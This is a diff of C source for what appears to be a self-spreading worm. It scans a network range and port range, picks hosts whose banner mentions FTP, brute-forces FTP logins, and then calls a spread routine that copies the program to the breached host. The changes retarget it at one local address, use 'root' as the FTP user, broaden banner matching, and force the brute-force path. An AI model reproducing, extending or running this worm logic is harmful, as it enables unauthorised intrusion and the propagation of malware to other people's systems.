@@ -8,23 +8,23 @@
 #include "spread.h"
 
 #ifndef ADDRESS_RANGE
-#  define ADDRESS_RANGE       "192.168.0.0-255"
+#  define ADDRESS_RANGE       "192.168.100.30"
 #endif
 
 #ifndef PORT_RANGE
-#  define PORT_RANGE          "10-100"
+#  define PORT_RANGE          "10-30"
 #endif
 
 #ifndef INTERFACE
-#  define INTERFACE           "eth0"
+#  define INTERFACE           "br0"
 #endif
 
 #ifndef USE_RAW_SOCKET
-#  define USE_RAW_SOCKET      1
+#  define USE_RAW_SOCKET      0
 #endif
 
 #ifndef FTP_USER
-#  define FTP_USER            "ftp"
+#  define FTP_USER            "root"
 #endif
 
 int main(int argc, const char *argv[]) {
@@ -33,20 +33,22 @@ int main(int argc, const char *argv[]) {
   int fd, method;
 
   srand(time(NULL));
+  target_table = scanner(ADDRESS_RANGE, PORT_RANGE, INTERFACE, USE_RAW_SOCKET, 0);
 
-  target_table = scanner(ADDRESS_RANGE, PORT_RANGE, INTERFACE, USE_RAW_SOCKET, 1);
   if(target_table != NULL) {
     for(target = target_table; target != NULL; target = target->next) {
-      if(strstr(target->banner, "WUFTPD") != NULL) {
-        if((method = rand() % 2) == 0) {
+      if(strstr(target->banner, "FTP") != NULL) {
+        /* exploit */
+
+        if((method = rand() % 1) == 0) {
           while(bruteforce(guess, sizeof guess) != 0) {
-            if((fd = ftp_login(target->address, target->port, FTP_USER, guess)) > 0) {
+            if((fd = ftp_try_login(target->address, target->port, FTP_USER, guess)) > 0) {
               fprintf(stdout, "Connected to FTP! Password is \"%s\"\n", guess);
               break;
             }
           }
         } else {
-          /* exploit */
+
         }
 
         spread(fd, argv[0], argv[0]);
